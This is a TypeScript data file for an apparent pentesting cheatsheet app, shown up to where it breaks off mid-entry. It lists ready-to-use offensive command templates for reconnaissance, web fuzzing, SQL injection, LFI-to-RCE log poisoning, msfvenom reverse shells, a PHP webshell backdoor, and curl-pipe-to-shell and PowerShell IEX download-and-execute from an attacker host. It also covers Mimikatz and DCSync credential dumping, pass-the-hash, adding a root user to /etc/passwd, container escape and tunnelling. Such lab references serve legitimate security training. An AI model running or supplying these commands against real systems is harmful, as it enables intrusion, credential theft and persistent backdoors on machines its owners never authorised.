import { CheatsheetCommand } from '../types';

export const CHEATSHEET_CATEGORIES = [
  { id: 'all', name: 'All Categories', icon: 'Terminal' },
  { id: 'revshell', name: 'Reverse Shells Generator', icon: 'Radio' },
  { id: 'network', name: '01. Recon & Port Scanning', icon: 'Radar' },
  { id: 'web', name: '02. Web & Directory Fuzzing', icon: 'Globe' },
  { id: 'exploitation', name: '03. Exploitation & Payloads', icon: 'Zap' },
  { id: 'linux-privesc', name: '04. Linux PrivEsc & TTY', icon: 'Cpu' },
  { id: 'active-directory', name: '05. Windows & Active Directory', icon: 'ShieldAlert' },
  { id: 'pivoting', name: '06. Pivoting & Tunnels', icon: 'GitFork' },
  { id: 'file-transfer', name: '07. File Transfers', icon: 'ArrowDownUp' },
  { id: 'custom', name: 'My Custom Commands', icon: 'Bookmark' },
];

export const INITIAL_CHEATSHEET: CheatsheetCommand[] = [
  // =================== 01. NETWORK DISCOVERY & PORT SCANNING ===================
  {
    id: 'nmap-quick',
    title: 'Fast SYN Scan (Top 1000 Ports)',
    category: 'network',
    description: 'Speedy initial discovery of open TCP ports with version detection and default safe scripts.',
    commandTemplate: 'nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt {TARGET_IP}',
    tags: ['nmap', 'recon', 'scan', 'tcp'],
    platform: 'Both'
  },
  {
    id: 'nmap-full',
    title: 'All-Port TCP Exhaustive Scan',
    category: 'network',
    description: 'Scan all 65,535 TCP ports at a high packet rate, saving output to all formats.',
    commandTemplate: 'nmap -p- -sC -sV -Pn --min-rate 3000 -oA nmap_full {TARGET_IP}',
    tags: ['nmap', 'all-ports', 'recon', 'full'],
    platform: 'Both'
  },
  {
    id: 'nmap-udp',
    title: 'Top UDP Service Discovery Scan',
    category: 'network',
    description: 'Quick scan of the most common 20 UDP ports (SNMP, TFTP, DNS, NTP, DHCP).',
    commandTemplate: 'sudo nmap -sU --top-ports 20 -Pn --open -oN nmap_udp.txt {TARGET_IP}',
    tags: ['nmap', 'udp', 'snmp', 'recon'],
    platform: 'Both'
  },
  {
    id: 'nmap-vuln',
    title: 'Nmap NSE Vulnerability Audit Scripts',
    category: 'network',
    description: 'Run all Nmap Vuln & Exploit category scripts against active discovered ports.',
    commandTemplate: 'nmap --script "vuln and safe" -Pn -oN nmap_vuln.txt {TARGET_IP}',
    tags: ['nmap', 'nse', 'cve', 'vuln'],
    platform: 'Both'
  },
  {
    id: 'rustscan-turbo',
    title: 'RustScan Ultra-Fast Port Detection',
    category: 'network',
    description: 'Fast asynchronous port scanner piping discovered open ports directly into detailed Nmap.',
    commandTemplate: 'rustscan -a {TARGET_IP} -r 1-65535 --ulimit 5000 -- -sC -sV -oN rustscan.txt',
    tags: ['rustscan', 'fast', 'recon'],
    platform: 'Both'
  },
  {
    id: 'masscan-rapid',
    title: 'Masscan High-Rate Subnet Sweeper',
    category: 'network',
    description: 'Blazing fast raw packet scanner across entire target subnet on default interface.',
    commandTemplate: 'sudo masscan -p1-65535 {TARGET_IP}/24 --rate=5000 -e {INTERFACE} -oL masscan.txt',
    tags: ['masscan', 'recon', 'cidr'],
    platform: 'Both'
  },

  // =================== 02. WEB ENUMERATION & FUZZING ===================
  {
    id: 'ffuf-dir',
    title: 'ffuf Directory & Endpoint Fuzzing',
    category: 'web',
    description: 'High-speed directory enumeration with auto-calibrated filtering and extension recursion.',
    commandTemplate: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://{TARGET_IP}/FUZZ -e .php,.html,.txt,.bak,.js -ac -mc 200,301,302,403',
    tags: ['ffuf', 'web', 'fuzz', 'dir'],
    platform: 'Both'
  },
  {
    id: 'ffuf-vhost',
    title: 'ffuf VHost / Virtual Subdomain Fuzzing',
    category: 'web',
    description: 'Fuzz HTTP Host header for virtual hosts; use -fs to filter default baseline size.',
    commandTemplate: 'ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_IP} -H "Host: FUZZ.target.htb" -mc 200,301,302 -fs 1234',
    tags: ['ffuf', 'vhost', 'subdomain', 'dns'],
    platform: 'Both'
  },
  {
    id: 'ffuf-param',
    title: 'ffuf Parameter Discovery (GET/POST)',
    category: 'web',
    description: 'Fuzz hidden query parameters on target page.',
    commandTemplate: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://{TARGET_IP}/index.php?FUZZ=test" -ac',
    tags: ['ffuf', 'params', 'query'],
    platform: 'Both'
  },
  {
    id: 'gobuster-dir',
    title: 'Gobuster Fast Directory Busting',
    category: 'web',
    description: 'Standard Go-based multithreaded directory search.',
    commandTemplate: 'gobuster dir -u http://{TARGET_IP}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sh,json -t 40 -b 404',
    tags: ['gobuster', 'web', 'dir'],
    platform: 'Both'
  },
  {
    id: 'feroxbuster-recurse',
    title: 'Feroxbuster Recursive Crawl & Fuzz',
    category: 'web',
    description: 'Deep Rust recursive crawler with smart 404 detection and auto-extract.',
    commandTemplate: 'feroxbuster -u http://{TARGET_IP}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,asp,aspx,jsp -d 2',
    tags: ['feroxbuster', 'recursive', 'crawler'],
    platform: 'Both'
  },
  {
    id: 'nikto-scan',
    title: 'Nikto Web Server Misconfiguration Audit',
    category: 'web',
    description: 'Exhaustive web server check for outdated components, index files, and CGI leaks.',
    commandTemplate: 'nikto -h http://{TARGET_IP} -Tuning 123bde -o nikto_{TARGET_IP}.html -Format htm',
    tags: ['nikto', 'web', 'misconfig'],
    platform: 'Both'
  },
  {
    id: 'wpscan-full',
    title: 'WPScan WordPress Enumeration & Attack',
    category: 'web',
    description: 'Enumerate vulnerable plugins, themes, and usernames on WordPress sites.',
    commandTemplate: 'wpscan --url http://{TARGET_IP}/ --enumerate ap,at,u,cb --plugins-detection aggressive',
    tags: ['wpscan', 'wordpress', 'cms'],
    platform: 'Both'
  },

  // =================== 03. EXPLOITATION & PAYLOADS ===================
  {
    id: 'sqlmap-auto',
    title: 'SQLmap Automated Injection & Database Dump',
    category: 'exploitation',
    description: 'Batch automated SQL injection extraction with risk and level escalation.',
    commandTemplate: 'sqlmap -u "http://{TARGET_IP}/item.php?id=1" --batch --random-agent --level=3 --risk=2 --dbs',
    tags: ['sqlmap', 'sqli', 'database', 'dump'],
    platform: 'Both'
  },
  {
    id: 'sqlmap-post',
    title: 'SQLmap Target Saved HTTP Request File',
    category: 'exploitation',
    description: 'Pass raw saved Burp Suite POST request file to extract DB tables.',
    commandTemplate: 'sqlmap -r request.txt -p username --batch --current-db --dump',
    tags: ['sqlmap', 'burp', 'post', 'sqli'],
    platform: 'Both'
  },
  {
    id: 'lfi-filter-wrapper',
    title: 'PHP Filter Base64 LFI Wrapper',
    category: 'exploitation',
    description: 'Read source code of PHP scripts through base64 conversion filter.',
    commandTemplate: 'http://{TARGET_IP}/index.php?page=php://filter/convert.base64-encode/resource=config.php',
    tags: ['lfi', 'php-filter', 'source-leak'],
    platform: 'Linux'
  },
  {
    id: 'lfi-proc-self-environ',
    title: 'LFI to RCE via Apache /proc/self/environ',
    category: 'exploitation',
    description: 'Inject User-Agent payload into environment file for code execution.',
    commandTemplate: 'curl -s -H "User-Agent: <?php system(\'id\'); ?>" "http://{TARGET_IP}/view.php?file=/proc/self/environ"',
    tags: ['lfi', 'rce', 'proc'],
    platform: 'Linux'
  },
  {
    id: 'msfvenom-elf-rev',
    title: 'msfvenom Linux x64 Staged Reverse TCP ELF',
    category: 'exploitation',
    description: 'Compile standalone ELF reverse shell binary for x64 Linux target.',
    commandTemplate: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf',
    tags: ['msfvenom', 'payload', 'elf', 'linux'],
    platform: 'Linux'
  },
  {
    id: 'msfvenom-windows-exe',
    title: 'msfvenom Windows x64 Reverse Meterpreter EXE',
    category: 'exploitation',
    description: 'Generate raw Windows x64 executable reverse meterpreter.',
    commandTemplate: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o payload.exe',
    tags: ['msfvenom', 'meterpreter', 'exe', 'windows'],
    platform: 'Windows'
  },

  // =================== 04. LINUX PRIVILEGE ESCALATION ===================
  {
    id: 'tty-upgrade-python',
    title: 'TTY Interactive Shell Stabilization (Python + stty)',
    category: 'linux-privesc',
    description: 'Upgrade dumb reverse shell to fully interactive pseudo-terminal with tab completion and arrow keys.',
    commandTemplate: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\n# Press Ctrl+Z to background shell\nstty raw -echo; fg\nexport TERM=xterm-256color\nstty rows 38 columns 140',
    tags: ['tty', 'pty', 'shell-upgrade', 'stty'],
    platform: 'Linux'
  },
  {
    id: 'linpeas-fast',
    title: 'LinPEAS Direct Memory Execution',
    category: 'linux-privesc',
    description: 'Download and execute LinPEAS directly in bash memory without writing to disk.',
    commandTemplate: 'curl -L http://{LHOST}:8000/linpeas.sh | sh',
    tags: ['linpeas', 'privesc', 'automated', 'curl'],
    platform: 'Linux'
  },
  {
    id: 'suid-find',
    title: 'SUID Binaries Exhaustive Discovery',
    category: 'linux-privesc',
    description: 'List all binaries on the filesystem with the SUID bit set, ignoring proc and dev.',
    commandTemplate: 'find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;',
    tags: ['suid', 'privesc', 'find'],
    platform: 'Linux'
  },
  {
    id: 'linux-capabilities',
    title: 'Linux Binary Capabilities (`getcap`) Audit',
    category: 'linux-privesc',
    description: 'Check binaries granted dangerous capabilities like cap_setuid or cap_dac_read_search.',
    commandTemplate: 'getcap -r / 2>/dev/null',
    tags: ['capabilities', 'getcap', 'privesc'],
    platform: 'Linux'
  },
  {
    id: 'sudo-check',
    title: 'Sudo Privileges Inspection (`sudo -l`)',
    category: 'linux-privesc',
    description: 'Check current user sudo permissions without or with password.',
    commandTemplate: 'sudo -l',
    tags: ['sudo', 'privesc', 'gtfobins'],
    platform: 'Linux'
  },
  {
    id: 'internal-ports-ss',
    title: 'Internal Loopback Services & Listening Ports',
    category: 'linux-privesc',
    description: 'Identify services running locally on 127.0.0.1 not exposed on external interfaces.',
    commandTemplate: 'ss -tulpn | grep LISTEN',
    tags: ['ports', 'network', 'internal', 'localhost'],
    platform: 'Linux'
  },
  {
    id: 'crontab-discovery',
    title: 'Crontabs & Scheduled System Jobs',
    category: 'linux-privesc',
    description: 'Inspect system-wide crontab files, hourly/daily tasks, and pspy monitored jobs.',
    commandTemplate: 'cat /etc/crontab /etc/cron.*/* 2>/dev/null; ls -la /var/spool/cron/crontabs/',
    tags: ['cron', 'scheduled-tasks', 'privesc'],
    platform: 'Linux'
  },

  // =================== 05. WINDOWS & ACTIVE DIRECTORY ===================
  {
    id: 'bloodhound-sharphound',
    title: 'SharpHound AD Collector Execution',
    category: 'active-directory',
    description: 'Collect all Active Directory objects, trusts, ACLs, and sessions into zip archive.',
    commandTemplate: '.\\SharpHound.exe -c All,GPOLocalGroup --zipfilename htb_ad.zip',
    tags: ['bloodhound', 'sharphound', 'ad', 'collector'],
    platform: 'Windows'
  },
  {
    id: 'powerview-enum',
    title: 'PowerView Domain & User Recon',
    category: 'active-directory',
    description: 'Import PowerView and list domain controllers, domain users, and admin groups.',
    commandTemplate: 'powershell -ep bypass\nImport-Module .\\PowerView.ps1\nGet-DomainUser -SPN | select samaccountname,serviceprincipalname\nGet-DomainGroupMember -Identity "Domain Admins"',
    tags: ['powerview', 'active-directory', 'kerberoasting'],
    platform: 'Windows'
  },
  {
    id: 'impacket-getuserspns',
    title: 'Impacket GetUserSPNs (Kerberoasting)',
    category: 'active-directory',
    description: 'Request Kerberos TGS tickets for accounts with SPNs and output format for Hashcat / John.',
    commandTemplate: 'impacket-GetUserSPNs {DOMAIN}/{USER}:{PASSWORD} -dc-ip {TARGET_IP} -request -outputfile hashes.kerberoast',
    tags: ['impacket', 'kerberoast', 'spn', 'tgs'],
    platform: 'Windows'
  },
  {
    id: 'impacket-secretsdump',
    title: 'Impacket SecretsDump (NTDS.dit & SAM Dumps)',
    category: 'active-directory',
    description: 'DCSync entire domain credentials directly over RPC using domain admin account.',
    commandTemplate: 'impacket-secretsdump {DOMAIN}/{USER}:{PASSWORD}@{TARGET_IP} -just-dc-ntlm',
    tags: ['impacket', 'secretsdump', 'dcsync', 'ntds'],
    platform: 'Windows'
  },
  {
    id: 'evil-winrm-connect',
    title: 'Evil-WinRM Remote PowerShell Access',
    category: 'active-directory',
    description: 'Connect to Windows target over WinRM port 5985 with credentials or Pass-The-Hash.',
    commandTemplate: 'evil-winrm -i {TARGET_IP} -u {USER} -p "{PASSWORD}" -s /opt/scripts',
    tags: ['evil-winrm', 'winrm', 'shell', 'pth'],
    platform: 'Windows'
  },
  {
    id: 'netexec-smb',
    title: 'NetExec / CrackMapExec Domain Sweep',
    category: 'active-directory',
    description: 'Check SMB credentials validity, local admin status (Pwn3d!), and password policies.',
    commandTemplate: 'nxc smb {TARGET_IP} -u {USER} -p "{PASSWORD}" --shares',
    tags: ['netexec', 'cme', 'smb', 'shares'],
    platform: 'Windows'
  },
  {
    id: 'mimikatz-sekurlsa',
    title: 'Mimikatz LogonPasswords LSASS Dump',
    category: 'active-directory',
    description: 'Dump plaintext passwords and NTLM hashes from memory of LSASS process.',
    commandTemplate: 'privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\nlsadump::lsa /patch',
    tags: ['mimikatz', 'lsass', 'hashes', 'privesc'],
    platform: 'Windows'
  },

  // =================== 06. PIVOTING & TUNNELING ===================
  {
    id: 'chisel-server',
    title: 'Chisel Attacker Reverse Tunnel Server',
    category: 'pivoting',
    description: 'Start Chisel reverse tunnel listener on attacker machine on port 8000.',
    commandTemplate: './chisel server -p 8000 --reverse',
    tags: ['chisel', 'pivot', 'socks5', 'tunnel'],
    platform: 'Both'
  },
  {
    id: 'chisel-client',
    title: 'Chisel Victim Reverse Socks Pivot',
    category: 'pivoting',
    description: 'Connect back to attacker server and open socks5 proxy port 1080 to access internal network.',
    commandTemplate: './chisel client {LHOST}:8000 R:socks',
    tags: ['chisel', 'pivot', 'socks', 'tunnel'],
    platform: 'Both'
  },
  {
    id: 'ssh-dynamic-socks',
    title: 'SSH Dynamic Port Forwarding (SOCKS5)',
    category: 'pivoting',
    description: 'Open a local SOCKS5 proxy on port 1080 routed through target SSH host.',
    commandTemplate: 'ssh -D 1080 -f -C -q -N {USER}@{TARGET_IP}',
    tags: ['ssh', 'socks5', 'proxychains', 'pivot'],
    platform: 'Both'
  },
  {
    id: 'ssh-local-forward',
    title: 'SSH Local Port Forwarding (-L)',
    category: 'pivoting',
    description: 'Forward target internal port (e.g. 8443) to local port 9999 on attacker machine.',
    commandTemplate: 'ssh -L 9999:127.0.0.1:8443 {USER}@{TARGET_IP} -N',
    tags: ['ssh', 'local-forward', 'tunnel'],
    platform: 'Both'
  },
  {
    id: 'ligolo-ng-setup',
    title: 'Ligolo-ng High-Performance TUN Interface Pivot',
    category: 'pivoting',
    description: 'Fast userland tunnel creating real system tun adapter for seamless Nmap/Metasploit routing.',
    commandTemplate: '# On Attacker:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# On Compromised Host:\n./agent -connect {LHOST}:11601 -ignore-cert\n\n# Add route on Attacker:\nsudo ip route add 172.16.1.0/24 dev ligolo',
    tags: ['ligolo', 'tun', 'fast-pivot', 'vpn'],
    platform: 'Both'
  },
  {
    id: 'socat-port-relay',
    title: 'Socat Bi-directional Port Relay',
    category: 'pivoting',
    description: 'Redirect traffic hitting port 8080 on compromised host straight to attacker listener.',
    commandTemplate: 'socat TCP-LISTEN:8080,fork,reuseaddr TCP:{LHOST}:{LPORT}',
    tags: ['socat', 'relay', 'pivot', 'port-forward'],
    platform: 'Both'
  },

  // =================== 07. FILE TRANSFERS ===================
  {
    id: 'python-http-server',
    title: 'Python 3 Quick HTTP Server',
    category: 'file-transfer',
    description: 'Spawn quick HTTP file hosting server on attacker machine on port 8000.',
    commandTemplate: 'python3 -m http.server 8000',
    tags: ['python', 'http', 'download'],
    platform: 'Both'
  },
  {
    id: 'powershell-webrequest',
    title: 'PowerShell In-Memory Download & Execute',
    category: 'file-transfer',
    description: 'Download payload from attacker HTTP server into Windows target.',
    commandTemplate: 'powershell -c "Invoke-WebRequest -Uri http://{LHOST}:8000/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe"',
    tags: ['powershell', 'iwr', 'download', 'windows'],
    platform: 'Windows'
  },
  {
    id: 'certutil-download',
    title: 'Certutil.exe Windows Native File Fetcher',
    category: 'file-transfer',
    description: 'Use built-in Windows certutil utility to download files bypassing standard restrictions.',
    commandTemplate: 'certutil -urlcache -split -f http://{LHOST}:8000/payload.exe C:\\Temp\\payload.exe',
    tags: ['certutil', 'lolbas', 'windows', 'download'],
    platform: 'Windows'
  },
  {
    id: 'impacket-smbserver',
    title: 'Impacket SMB Server File Share',
    category: 'file-transfer',
    description: 'Host local folder as unauthenticated SMB share accessible by Windows machines.',
    commandTemplate: 'sudo impacket-smbserver share $(pwd) -smb2support',
    tags: ['impacket', 'smb', 'transfer'],
    platform: 'Both'
  },

  // =================== ADDITIONAL RECON & NETWORK DISCOVERY ===================
  {
    id: 'snmpwalk-public',
    title: 'SNMPwalk v2c Community Enumeration',
    category: 'network',
    description: 'Query SNMP management information base using default public community string.',
    commandTemplate: 'snmpwalk -v 2c -c public {TARGET_IP}',
    tags: ['snmp', 'recon', 'udp'],
    platform: 'Both'
  },
  {
    id: 'onesixtyone-brute',
    title: 'onesixtyone SNMP Community String Brute',
    category: 'network',
    description: 'Rapidly brute-force SNMP community strings from wordlist against target host.',
    commandTemplate: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {TARGET_IP}',
    tags: ['snmp', 'bruteforce', 'recon'],
    platform: 'Both'
  },
  {
    id: 'rpcclient-null',
    title: 'rpcclient Anonymous / Null Session User Enum',
    category: 'network',
    description: 'Establish null session to RPC endpoint and list domain users, groups, and password policy.',
    commandTemplate: 'rpcclient -U "" -N {TARGET_IP} -c "enumdomusers; querydispinfo; enumdomgroups"',
    tags: ['rpc', 'null-session', 'smb', 'active-directory'],
    platform: 'Windows'
  },
  {
    id: 'smbmap-guest',
    title: 'SMBMap Anonymous / Guest Share Check',
    category: 'network',
    description: 'Check SMB permissions across all shares anonymously without credentials.',
    commandTemplate: 'smbmap -H {TARGET_IP} -u "" -p ""',
    tags: ['smb', 'smbmap', 'shares', 'recon'],
    platform: 'Both'
  },
  {
    id: 'dig-axfr',
    title: 'DNS Zone Transfer (AXFR) Audit',
    category: 'network',
    description: 'Attempt full DNS zone transfer from target nameserver to expose all subdomains.',
    commandTemplate: 'dig axfr @{TARGET_IP} {DOMAIN}',
    tags: ['dns', 'axfr', 'zone-transfer', 'recon'],
    platform: 'Both'
  },

  // =================== ADDITIONAL WEB ENUMERATION & EXPLOITATION ===================
  {
    id: 'sqlmap-risk',
    title: 'SQLmap Heavy Injection Probe (Risk 3 / Level 5)',
    category: 'web',
    description: 'High-potency SQL injection test checking all HTTP headers, cookies, and injection boundaries.',
    commandTemplate: 'sqlmap -u "http://{TARGET_IP}/page?id=1" --batch --risk=3 --level=5 --threads=4 --dbs',
    tags: ['sqlmap', 'sqli', 'web', 'advanced'],
    platform: 'Both'
  },
  {
    id: 'jwt-crack',
    title: 'JWT Secret Key HMAC-SHA256 Cracking',
    category: 'web',
    description: 'Crack HS256 signed JSON Web Token secrets offline using rockyou wordlist.',
    commandTemplate: 'hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt',
    tags: ['jwt', 'hashcat', 'crypto', 'web'],
    platform: 'Both'
  },
  {
    id: 'graphql-introspection',
    title: 'GraphQL Schema Introspection Query',
    category: 'web',
    description: 'Query GraphQL endpoint for full type schema, queries, mutations, and hidden fields.',
    commandTemplate: 'curl -s -X POST -H "Content-Type: application/json" -d \'{"query":"{__schema{types{name,fields{name}}}}"}\' http://{TARGET_IP}/graphql | jq .',
    tags: ['graphql', 'api', 'introspection', 'web'],
    platform: 'Both'
  },
  {
    id: 'git-dump',
    title: 'Exposed .git Source Code Extraction',
    category: 'web',
    description: 'Dump full repository commits and source code from misconfigured public /.git/ directory.',
    commandTemplate: 'git-dumper http://{TARGET_IP}/.git/ ./git-dump',
    tags: ['git', 'source-leak', 'git-dumper', 'web'],
    platform: 'Both'
  },
  {
    id: 'lfi-log-poison',
    title: 'LFI Log Poisoning via User-Agent',
    category: 'web',
    description: 'Inject PHP execution payload into web server access log, then include via LFI.',
    commandTemplate: 'curl -s -A "<?php system(\\$_GET[\'cmd\']); ?>" http://{TARGET_IP}/ && curl "http://{TARGET_IP}/index.php?page=/var/log/apache2/access.log&cmd=id"',
    tags: ['lfi', 'rce', 'log-poisoning', 'apache'],
    platform: 'Linux'
  },

  // =================== ADDITIONAL EXPLOITATION & CRACKING ===================
  {
    id: 'hashcat-ntlm',
    title: 'Hashcat NTLM Hashes (Mode 1000)',
    category: 'exploitation',
    description: 'High-speed GPU cracking of Windows NTLM hashes dumped from SAM or NTDS.dit.',
    commandTemplate: 'hashcat -m 1000 ntlm.hashes /usr/share/wordlists/rockyou.txt -O',
    tags: ['hashcat', 'ntlm', 'cracking', 'windows'],
    platform: 'Both'
  },
  {
    id: 'hashcat-sha512',
    title: 'Hashcat Linux /etc/shadow Hashes (Mode 1800)',
    category: 'exploitation',
    description: 'Crack SHA512crypt ($6$) passwords dumped from Linux /etc/shadow.',
    commandTemplate: 'hashcat -m 1800 shadow.hashes /usr/share/wordlists/rockyou.txt -O',
    tags: ['hashcat', 'shadow', 'sha512', 'linux'],
    platform: 'Linux'
  },
  {
    id: 'hashcat-kerberoast',
    title: 'Hashcat Kerberos 5 TGS (Mode 13100)',
    category: 'exploitation',
    description: 'Crack Kerberoasted Service Principal Name tickets to reveal service account passwords.',
    commandTemplate: 'hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -O',
    tags: ['hashcat', 'kerberoast', 'tgs', 'active-directory'],
    platform: 'Both'
  },
  {
    id: 'hashcat-asrep',
    title: 'Hashcat Kerberos 5 AS-REP (Mode 18200)',
    category: 'exploitation',
    description: 'Crack AS-REP hashes captured for accounts with Kerberos preauthentication disabled.',
    commandTemplate: 'hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt -O',
    tags: ['hashcat', 'asrep', 'kerberos', 'active-directory'],
    platform: 'Both'
  },
  {
    id: 'hydra-ssh',
    title: 'Hydra Multi-Threaded SSH Brute Force',
    category: 'exploitation',
    description: 'Brute-force SSH service credentials using rockyou password list.',
    commandTemplate: 'hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET_IP} ssh -t 4',
    tags: ['hydra', 'ssh', 'bruteforce'],
    platform: 'Both'
  },
  {
    id: 'hydra-http-post',
    title: 'Hydra Web Login Form Brute Force',
    category: 'exploitation',
    description: 'Target HTTP POST web login endpoint with username and password dictionary.',
    commandTemplate: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt {TARGET_IP} http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"',
    tags: ['hydra', 'http', 'web', 'bruteforce'],
    platform: 'Both'
  },
  {
    id: 'php-mini-webshell',
    title: 'Minimal PHP Single-Line Backdoor',
    category: 'exploitation',
    description: 'Lightweight PHP command execution backdoor for quick web root persistence.',
    commandTemplate: 'echo \'<?php system($_GET["cmd"]); ?>\' > shell.php',
    tags: ['webshell', 'php', 'backdoor'],
    platform: 'Linux'
  },
  {
    id: 'cmd-injection-space-bypass',
    title: 'Command Injection Space Filter Bypass ($IFS)',
    category: 'exploitation',
    description: 'Bypass space character filtering in vulnerable web commands using bash internal field separator.',
    commandTemplate: 'cat$IFS/etc/passwd',
    tags: ['cmd-injection', 'bypass', 'filter', 'linux'],
    platform: 'Linux'
  },

  // =================== ADDITIONAL LINUX PRIVESC ===================
  {
    id: 'tar-wildcard-privesc',
    title: 'Tar Wildcard Injection Cronjob Exploit',
    category: 'linux-privesc',
    description: 'Abuse tar wildcard in automated root cronjob to execute arbitrary shell commands via checkpoint.',
    commandTemplate: 'touch /var/backup/--checkpoint=1 && touch "/var/backup/--checkpoint-action=exec=sh root.sh"',
    tags: ['tar', 'wildcard', 'cron', 'privesc'],
    platform: 'Linux'
  },
  {
    id: 'nfs-no-root-squash',
    title: 'NFS no_root_squash SUID Binary Exploit',
    category: 'linux-privesc',
    description: 'Mount vulnerable NFS exported directory locally, compile SUID bash binary, and execute on target.',
    commandTemplate: 'sudo mount -t nfs {TARGET_IP}:/share /mnt && cp /bin/bash /mnt/rootbash && chmod +s /mnt/rootbash && /mnt/rootbash -p',
    tags: ['nfs', 'no-root-squash', 'suid', 'privesc'],
    platform: 'Linux'
  },
  {
    id: 'docker-container-escape',
    title: 'Docker Host Root Filesystem Mount Escape',
    category: 'linux-privesc',
    description: 'Spawn privileged docker container mounting host root filesystem to /host.',
    commandTemplate: 'docker run -v /:/host -it alpine chroot /host /bin/bash',
    tags: ['docker', 'escape', 'container', 'privesc'],
    platform: 'Linux'
  },
  {
    id: 'pspy-process-sniff',
    title: 'pspy Snooping Scheduled System Processes',
    category: 'linux-privesc',
    description: 'Monitor running processes without root permissions to discover transient cronjobs and arguments.',
    commandTemplate: './pspy64 -pf -i 1000',
    tags: ['pspy', 'cron', 'monitoring', 'privesc'],
    platform: 'Linux'
  },
  {
    id: 'writable-passwd-root',
    title: 'Writable /etc/passwd New Root User Injection',
    category: 'linux-privesc',
    description: 'Generate password hash and append a new user with UID 0 (root) to writable /etc/passwd.',
    commandTemplate: 'echo "toor:$(openssl passwd -1 -salt evil Password123!):0:0:root:/root:/bin/bash" >> /etc/passwd',
    tags: ['passwd', 'root', 'misconfig', 'privesc'],
    platform: 'Linux'
  },

  // =================== ADDITIONAL WINDOWS & ACTIVE DIRECTORY ===================
  {
    id: 'impacket-getnpusers',
    title: 'Impacket GetNPUsers (AS-REP Roasting)',
    category: 'active-directory',
    description: 'Query users with DONT_REQ_PREAUTH set to retrieve crackable Kerberos AS-REP hashes without creds.',
    commandTemplate: 'impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {TARGET_IP} -format hashcat -outputfile asreproast.hashes',
    tags: ['impacket', 'asrep', 'kerberos', 'active-directory'],
    platform: 'Windows'
  },
  {
    id: 'certipy-find',
    title: 'Certipy AD CS Vulnerable Template Enumeration',
    category: 'active-directory',
    description: 'Find vulnerable Active Directory Certificate Services templates (ESC1-ESC13).',
    commandTemplate: 'certipy find -u {USER}@{DOMAIN} -p "{PASSWORD}" -dc-ip {TARGET_IP} -vulnerable -stdout',
    tags: ['certipy', 'adcs', 'certificates', 'active-directory'],
    platform: 'Windows'
  },
  {
    id: 'certipy-req-esc1',
    title: 'Certipy ESC1 Administrator Impersonation',
    category: 'active-directory',
    description: 'Request certificate as Administrator using vulnerable ESC1 template allowing SAN specification.',
    commandTemplate: 'certipy req -u {USER}@{DOMAIN} -p "{PASSWORD}" -dc-ip {TARGET_IP} -ca {CA_NAME} -template ESC1_Template -upn Administrator@{DOMAIN}',
    tags: ['certipy', 'esc1', 'impersonation', 'active-directory'],
    platform: 'Windows'
  },
  {
    id: 'impacket-wmiexec-pth',
    title: 'Impacket WMIExec (Pass-The-Hash)',
    category: 'active-directory',
    description: 'Execute semi-interactive commands over WMI using NTLM hash without knowing plaintext password.',
    commandTemplate: 'impacket-wmiexec -hashes :{NTLM_HASH} {USER}@{TARGET_IP}',
    tags: ['impacket', 'wmiexec', 'pth', 'lateral-movement'],
    platform: 'Windows'
  },
  {
    id: 'impacket-psexec-pth',
    title: 'Impacket PSExec (Pass-The-Hash as SYSTEM)',
    category: 'active-directory',
    description: 'Spawn SYSTEM service shell on target using NTLM hash over SMB port 445.',
    commandTemplate: 'impacket-psexec -hashes :{NTLM_HASH} Administrator@{TARGET_IP}',
    tags: ['impacket', 'psexec', 'pth', 'windows'],
    platform: 'Windows'
  },
  {
    id: 'winpeas-powershell',
    title: 'WinPEAS In-Memory Download & Execute',
    category: 'active-directory',
    description: 'Execute WinPEAS privilege escalation scanner directly in memory via WebClient.',
    commandTemplate: 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{LHOST}:8000/winPEAS.ps1\')"',
    tags: ['winpeas', 'privesc', 'powershell', 'windows'],
    platform: 'Windows'
  },
  {
    id: 'always-install-elevated',
    title: 'AlwaysInstallElevated Registry Query',
    category: 'active-directory',
    description: 'Verify if MSI packages run with elevated SYSTEM permissions via registry keys.',
    commandTemplate: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
    tags: ['alwaysinstallelevated', 'msi', 'privesc', 'windows'],
    platform: 'Windows'
  },
  {
    id: 'unquoted-service-paths',
    title: 'Unquoted Service Path Enumeration',
    category: 'active-directory',
    description: 'Detect auto-starting Windows services with unquoted executable paths containing spaces.',
    commandTemplate: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """',
    tags: ['unquoted-service', 'wmic', 'privesc', 'windows'],
    platform: 'Windows'
  },
  {
    id: 'godpotato-privesc',
    title: 'GodPotato SeImpersonatePrivilege Exploit',
    category: 'active-directory',
    description: 'Abuse SeImpersonatePrivilege on Windows Server 2012-2022 via DCOM/RPC reflection.',
    commandTemplate: 'GodPotato-NET4.exe -cmd "cmd.exe /c whoami"',
